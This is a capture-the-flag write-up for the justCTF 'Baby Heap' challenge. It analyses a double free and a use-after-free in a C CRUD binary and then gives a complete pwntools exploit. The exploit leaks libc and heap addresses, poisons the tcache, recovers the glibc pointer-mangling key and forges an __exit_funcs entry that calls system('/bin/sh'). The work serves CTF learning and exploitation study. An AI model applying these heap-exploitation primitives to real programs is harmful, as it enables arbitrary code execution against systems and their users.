# Baby Heap - pwn - baby

## Description

### Baby Heap

Welcome to my CRUD application. Wait, you expected a REST API? Nah, have this C program of questionable quality instead.

```
nc baby-heap.nc.jctf.pro 1337
```

* [babyheap.tar.gz](https://s3.cdn.justctf.team/80a295d6-84a7-4476-b90c-1f1fc3b4bdfd/babyheap.tar.gz)

----

# Setup

Patch the binary to use the given libc version (3.20)
```
patchelf --set-interpreter ./ld-linux-x86-64.so.2 --replace-needed libc.so.6 ./libc.so.6 --output ./patched ./babyheap
```

# Bugs

## 1. Double Free

When deleting a chunk, the binary does not clear the malloc-returned chunk address from the global `chunks` list. As such, you can simple free the same index.

```cpp
004014bd    int64_t delete_chunk()
004014bd    {
004014bd        int32_t idx = get_index();
004014bd        
004014ec        if (chunks[(int64_t)idx])
0040151a            return free(chunks[(int64_t)idx]);
0040151a        
004014f8        return puts("This chunk is empty");
004014bd    }
```

## 2. Use After Free

**read**
Due to the above double free, it is possible to read from a free'd chunk.
```cpp
004013cd    ssize_t read_chunk()
004013cd    {
004013cd        int32_t rax = get_index();
004013cd        
004013fc        if (chunks[(int64_t)rax])
00401434            return write(1, chunks[(int64_t)rax], 48);
00401434        
00401408        return puts("This chunk is empty");
004013cd    }
```

**write**
Again due to the above double free, we can also "update" (write to) a free'd chunk.
```cpp
0040143b    ssize_t update_chunk()
0040143b    {
0040143b        int32_t rax = get_index();
0040143b        
0040146a        if (!chunks[(int64_t)rax])
0040148c            return puts("This chunk is empty");
0040148c        
0040148c        printf("Content? ");
004014b6        return read(0, chunks[(int64_t)rax], 48);
0040143b    }
```


# Solution

Whilst the intended solution in this challenge (as indicated by the flag) is ROP, I instead opted to use a purely data-based approach.

My exploit chain uses the `__exit_funcs` technique, this is because I am a `__malloc_hook` monkey and so I only know how to do pointer overwrites.

For this to work, we need to perform the following steps.

1. Leak libc base address in order to resolve the `__exit_funcs` pointer that we will overwrite later
2. Either leak the address of `_dl_fini` or `fs_base` to determine the libc pointer encryption key.
3. Write our own `__exit_funcs` at a known location in memory
4. Overwrite `__exit_funcs` so that it points to our fake `__exit_funcs`
5. Trigger a call to `exit` 

## 1. Leak Libc base address

In this challenge, there is nothing on the heap by default, and as such I opted to abuse the `malloc_consolidate` [as described by QuarksLab](https://blog.quarkslab.com/heap-exploitation-glibc-internals-and-nifty-tricks.html#2.%20libc%20leak) in order to get a `libc_arena` pointer on the heap.

From quarkslab:
> We can use `malloc_consolidate()`! This function is triggered whenever the fastbins hold some chunks and a big allocation is made. Fastbin chunks are actually never considered truly free by the allocator so it needs to call this function periodically in order to truly free them and avoid losing memory. To truly free them means to put them into the unsorted bin, which will eventually be emptied by promoting the chunks it holds to smallbins or tcache bins.

To pull this off we do the following...

Allocate and free Tcache size + 1 chunks so that we end up freeing a chunk in the fastbin.

```python
# get a free chunk in the fastbin
for i in range(0, 8):
    create(i, b"")
for i in range(7, -1, -1):
    delete(i)
```
![](http://ctfnote.frogcouncil.team/pad/uploads/a0df5c17-dd59-4315-a44c-35c938bcf192.png)

As you can see, we now have one free'd chunk in the fastbin. From here, we can abuse the `scanf` call in the menu in order to force a large heap allocation (triggering `malloc_consolidate`!).

```python
io.sendlineafter(b"> ", b"1"*0x500) # send 0x500 1's as a menu command
```
![](http://ctfnote.frogcouncil.team/pad/uploads/7efe4637-0751-4710-ac8c-8da479b08ad8.png)

Now to get the libc base address, we can simply abuse our UAF read in order to read the data stored at the free'd chunk.
![](http://ctfnote.frogcouncil.team/pad/uploads/069f2718-ee30-4cdf-aa8d-5c40cfd2f2e5.png)

```python
# this chunk will contain libc address
libc_leak = u64(read(0)[:8])
libc_base = libc_leak - 0x203000 - 0xb50
libc_data = libc_leak - 0xb50
log.success(f"libc @ {hex(libc_base)}")
log.success(f"libc .data @ {hex(libc_data)}")
```

## 2. Leak Heap base address

We need the heap base address to determine the location of chunks we allocate. This will be used later to figure out where our fake `__exit_funcs` struct will be stored in memory.

Luckily, leaking the heap base is super easy, we can just read the last chunk we free'd after our libc leak since it contains `heap_base >> 12`.

```python
# Get heap base
heap_base = u64(read(7)[:8])<<12
log.success(f"heap @ {hex(heap_base)}")
```
![](http://ctfnote.frogcouncil.team/pad/uploads/39c39e50-6888-403b-954a-5637f1996b5b.png)

## 3. Resolve fs_base address to control pointer encryption key 

Since getting the base address of `_dl_fini` requires a `ld.so` leak (which I didn't have), I opted to try and leak `fs_base` instead.

I found that just after libc in memory, there was a RW anonymous section. Since it is always directly after the end of libc, we can use the libc leak to determine pointers within this region of memory also. 
![](http://ctfnote.frogcouncil.team/pad/uploads/b7a96cdf-ed6c-4c53-b578-a85762f3ebe5.png)

Searching for pointers in this section actually showed that there is a pointer to `fs_base`! The light blue pointers are actually the stack canary followed by the libc pointer encryption key.
![](http://ctfnote.frogcouncil.team/pad/uploads/7eb67e1b-6563-4452-918f-ae853dea653b.png)

To read this pointer, we can combine UAF and a double free in to perform tcache poisoning, allowing us to allocate a heap chunk at a controlled address. Then, again due to our UAF, this gives us arbitrary read and write, we can just do it a limited number of times.

To do so, we perform the following. 
1. Allocate two chunks and free them both in order to have control over some tcache entries.
2. Overwrite the `tcache_entry->key` within the first chunk we freed in order to enable a double free. (otherwise it'd be detected and the binary would crash)
3. Get the base address of the chunk via deobfuscating the pointer (a tcache protection enabled in recent versions of glibc)
4. Overwrite the `tcache_entry->next` pointer within the chunk we double freed to an address we want (in this case the address that contains a pointer to `fs_base`)

It's worth noting that I subtract an offset from most of these arbitrary allocations, and that's because of either alignment (tcache chunks must be 0x10 aligned), and to avoid corruption of critical data, since the allocation will write chunk metadata also.

```python
create(10, b"")
create(9, b"")
delete(9)
delete(10) # libc chunk
update(9, b"AAAAAAAABBBBBBBB") # tcache key overwrite
delete(9)
chunk_pos = deobfuscate(u64(read(9)[:8]))
update(9, p64(obfuscate(p_fs_base-0x18, chunk_pos)))
create(11, b"")
create(12, b"") # fs_base_ptr should be in this chunk
```

Now we have a chunk that contains the ptr to `fs_base`, we do need to perform one extra step. In allocating our chunk we overwrote a critical field used by calls to `read` (most of the binary does this) and as such we need to re-write the value of 0 there. Luckily this is pretty simple:
```python
update(12, b"\x00\x00\x00\x00")
```

Finally, we can read the address of `fs_base` from this chunk!
```python
fs_base = u64(read(12)[8:16])
log.success(f"fs_base @ {hex(fs_base)}")
```
![](http://ctfnote.frogcouncil.team/pad/uploads/c3993210-f843-486c-9b2c-8e936f72c817.png)

## 4. Gaining control over the pointer encryption key

We perform the same arbitrary allocation primitive as before in order to allocate a chunk within `fs_base`.
```python
# Allocate chunk in fs_base to get encryption key
delete(8)
delete(15)
update(8, b"AAAAAAAADDDD")
delete(8)
chunk_pos = deobfuscate(u64(read(8)[:8]))
update(8, p64(obfuscate(fs_base+0x30, chunk_pos)))
create(18, b"")
create(19, b"")
```
![](http://ctfnote.frogcouncil.team/pad/uploads/838fc4ac-05a1-45f6-b96c-965cd3dffd06.png)

## 5. Gain control of libc's `__exit_funcs` pointer 

Again, using the arbitrary allocation primitive in combination with the libc leak we can allocate a chunk that gives us control over the `__exit_funcs` pointer. (It's in the `.data` section of libc) and can be found in a disassembler/debugger via looking at the params of `exit`.

```python
# Allocate mem at __exit_funcs so we can overwrite the pointer with our own heap chunk
delete(11)
delete(14)
update(11, b"AAAAAAAACCCCCCCC")
delete(11)
chunk_pos = deobfuscate(u64(read(11)[:8]))
update(11, p64(obfuscate(__exit_funcs-0x10, chunk_pos)))
create(15, b"") # freed later
create(16, b"") # __exit_funcs chunk (offset -0x10 so we dont corrupt)
```

## 6. Create our fake `__exit_funcs`.

At this point, I had allocated chunk `18` but was not using it for anything, and its base address is a constant offset from the heap base (which we leaked earlier remember)

```python
# Write fake exit_function entry to chunk 18 since we're not using it for anything
# and we know its base address due to the earlier heap base leak.
###########  next   | count  | type (cxa) | addr (system@libc)                | arg                                | not used
onexit_fun = p64(0) + p64(1) + p64(4)     + encrypt(libc.sym["system"], key)  + p64(next(libc.search(b"/bin/sh"))) + p64(0)
update(18, onexit_fun)
CHUNK_EIGHTEEN_ADDR = heap_base + 0x2e0
log.success(f"wrote custom exit_functions @ {hex(CHUNK_EIGHTEEN_ADDR)}")
```

## 7. Trigger our payload

There are two steps to this...

**1. Overwrite the libc `__exit_funcs` pointer with the pointer to our fake entry**
```python
# Overwrite __exit_funcs (need to rewrite but should work, check in gdb)
update(16, read(16)[:0x10] + p64(CHUNK_EIGHTEEN_ADDR))
```

**2. Trigger a call to exit**
```python
# trigger payload (entering 0 calls exit) and get flag
io.sendlineafter(b"> ", b"0")
io.sendline(b"cat flag.txt")
try:
    log.success(io.recvuntil(b"}").decode())
    io.close()
except:
    exit(1)
```

## 8. Profit :\)

![](http://ctfnote.frogcouncil.team/pad/uploads/efc2fea3-38f2-4a75-b651-b488aaccf9c3.png)


# Solver

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host baby-heap.nc.jctf.pro --port 1337 ./patched
from pwn import *

#context.log_level = 'error'

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'baby-heap.nc.jctf.pro'
port = int(args.PORT or 1337)

# Use the specified remote libc version unless explicitly told to use the
# local system version with the `LOCAL_LIBC` argument.
# ./exploit.py LOCAL LOCAL_LIBC
if args.LOCAL_LIBC:
    libc = exe.libc
elif args.LOCAL:
    library_path = libcdb.download_libraries('libc.so.6')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('libc.so.6')
else:
    libc = ELF('libc.so.6')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

def create(idx: int, data: bytes) -> None:
    io.recvuntil(b"> ")
    io.sendline(b"1")
    io.recvuntil(b"Index? ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"Content? Content? ")
    io.sendline(data)

def read(idx: int) -> bytes:
    io.recvuntil(b"> ")
    io.sendline(b"2")
    io.recvuntil(b"Index? ")
    io.sendline(str(idx).encode())
    return io.recvuntil(b"Menu:")[:-5]

def update(idx: int, data: bytes) -> None:
    io.recvuntil(b"> ")
    io.sendline(b"3")
    io.recvuntil(b"Index? ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"Content? ")
    io.sendline(data)

def delete(idx: int) -> None:
    io.recvuntil(b"> ")
    io.sendline(b"4")
    io.recvuntil(b"Index? ")
    io.sendline(str(idx).encode())

def quit() -> None:
    io.recvuntil(b"> ")
    io.sendline(b"0")

# Defeat glibc's heap pointer obfuscation
# mangled = ptr ^ (address >> 12), where address is the address the pointer is stored at
# If the pointer is stored in the same page, we can fully recover the leaked pointer value,
# as we know the first 12 bits
def deobfuscate(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

def obfuscate(val, pos):
    return val ^ (pos >> 12)

# The shifts are copied from the above blogpost
# Rotate left: 0b1001 --> 0b0011
rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

# Rotate right: 0b1001 --> 0b1100
ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))


# encrypt a function pointer
def encrypt(v, key):
    return p64(rol(v ^ key, 0x11, 64))

io = start()

# get a free chunk in the fastbin
for i in range(0, 8):
    create(i, b"")
for i in range(7, -1, -1):
    delete(i)

# Send large input to scanf (triggers malloc_consolidate())
io.sendlineafter(b"> ", b"1"*0x500)

# this chunk will contain libc address
libc_leak = u64(read(0)[:8])
libc_base = libc_leak - 0x203000 - 0xb50
libc_data = libc_leak - 0xb50
log.success(f"libc @ {hex(libc_base)}")
log.success(f"libc .data @ {hex(libc_data)}")

libc.address = libc_base

# Get heap base
heap_base = u64(read(7)[:8])<<12
log.success(f"heap @ {hex(heap_base)}")

create(8, b"") # parent tcache chunk

# Useful vars
p_fs_base = libc.address + 0x205728
__exit_funcs = libc_data + 0x680
fs_base = 0
stack_base = 0
libc_system = libc.sym["system"]
libc_binsh  = next(libc.search(b"/bin/sh"))

# these will be used later
create(14, b"") # used
create(13, b"") # not used

# Read into anonymous section to get fs_base ptr, will be used later to overwrite key.
create(10, b"")
create(9, b"")
delete(9)
delete(10) # libc chunk
update(9, b"AAAAAAAABBBBBBBB")
delete(9)
chunk_pos = deobfuscate(u64(read(9)[:8]))
update(9, p64(obfuscate(p_fs_base-0x18, chunk_pos)))
create(11, b"")
create(12, b"") # fs_base_ptr should be in this chunk
update(12, b"\x00\x00\x00\x00")
fs_base = u64(read(12)[8:16])
log.success(f"fs_base @ {hex(fs_base)}")

# Allocate mem at __exit_funcs so we can overwrite the pointer with our own heap chunk
delete(11)
delete(14)
update(11, b"AAAAAAAACCCCCCCC")
delete(11)
chunk_pos = deobfuscate(u64(read(11)[:8]))
update(11, p64(obfuscate(__exit_funcs-0x10, chunk_pos)))
create(15, b"") # freed later
create(16, b"") # __exit_funcs chunk (offset -0x10 so we dont corrupt)

# Allocate chunk in fs_base to get encryption key
delete(8)
delete(15)
update(8, b"AAAAAAAADDDD")
delete(8)
chunk_pos = deobfuscate(u64(read(8)[:8]))
update(8, p64(obfuscate(fs_base+0x30, chunk_pos)))
create(18, b"")
create(19, b"")

key = u64(read(19)[:8])
log.success(f"ptr encryption key : {hex(key)}")


# Write fake exit_function entry to chunk 18 since we're not using it for anything
# and we know its base address due to the earlier heap base leak.
###########  next   | count  | type (cxa) | addr (system@libc)                | arg                                | not used
onexit_fun = p64(0) + p64(1) + p64(4)     + encrypt(libc.sym["system"], key)  + p64(next(libc.search(b"/bin/sh"))) + p64(0)
update(18, onexit_fun)
CHUNK_EIGHTEEN_ADDR = heap_base + 0x2e0
log.success(f"wrote custom exit_functions @ {hex(CHUNK_EIGHTEEN_ADDR)}")


# Overwrite __exit_funcs (need to rewrite but should work, check in gdb)
update(16, read(16)[:0x10] + p64(CHUNK_EIGHTEEN_ADDR))


# trigger payload (entering 0 calls exit) and get flag
io.sendlineafter(b"> ", b"0")
io.sendline(b"cat flag.txt")
try:
    log.success(io.recvuntil(b"}").decode())
    io.close()
except:
    exit(1)
```

# Starter Template

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host baby-heap.nc.jctf.pro --port 1337 ./patched
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'baby-heap.nc.jctf.pro'
port = int(args.PORT or 1337)

# Use the specified remote libc version unless explicitly told to use the
# local system version with the `LOCAL_LIBC` argument.
# ./exploit.py LOCAL LOCAL_LIBC
if args.LOCAL_LIBC:
    libc = exe.libc
elif args.LOCAL:
    library_path = libcdb.download_libraries('libc.so.6')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('libc.so.6')
else:
    libc = ELF('libc.so.6')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

def create(idx: int, data: bytes) -> None:
    io.recvuntil(b"> ")
    io.sendline(b"1")
    io.recvuntil(b"Index? ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"Content? Content? ")
    io.sendline(data)

def read(idx: int) -> bytes:
    io.recvuntil(b"> ")
    io.sendline(b"2")
    io.recvuntil(b"Index? ")
    io.sendline(str(idx).encode())
    return io.recvuntil(b"Menu:")[:-5]

def update(idx: int, data: bytes) -> None:
    io.recvuntil(b"> ")
    io.sendline(b"3")
    io.recvuntil(b"Index? ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"Content? ")
    io.sendline(data)

def delete(idx: int) -> None:
    io.recvuntil(b"> ")
    io.sendline(b"4")
    io.recvuntil(b"Index? ")
    io.sendline(str(idx).encode())

def quit() -> None:
    io.recvuntil(b"> ")
    io.sendline(b"0")


io = start()

create(1, b"balls")
read(1)
update(1, b"jaws")
read(1)
delete(1)
delete(1)

io.interactive()
```

# Primatives

## Heap base leak
```python
io = start()

create(0, b"A")
delete(0)
heap_base = (u64(read(0)[:5].ljust(8, b"\x00")) << 12)
log.success(f"tcache @ {hex(heap_base)}")
```

## Libc base leak
```python
# get a free chunk in the fastbin
for i in range(1, 9):
    create(i, b"A")
for i in range(8, 0, -1):
    delete(i)

# Send large input to scanf (triggers malloc_consolidate())
io.sendlineafter(b"> ", b"1"*0x500)

# fill tcache chunks
for i in range(9, 16):
    create(i, b"")

# this chunk will contain libc address
create(16, b"")
libc_leak = u64(read(16)[:8])
libc_base = libc_leak - 0x203000 - 0xb0a
log.success(f"libc leak @ {hex(libc_leak)}")
log.success(f"libc base @ {hex(libc_base)}")
```



# Utils

```python
# Defeat glibc's heap pointer obfuscation
# mangled = ptr ^ (address >> 12), where address is the address the pointer is stored at
# If the pointer is stored in the same page, we can fully recover the leaked pointer value,
# as we know the first 12 bits
def deobfuscate(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val
```



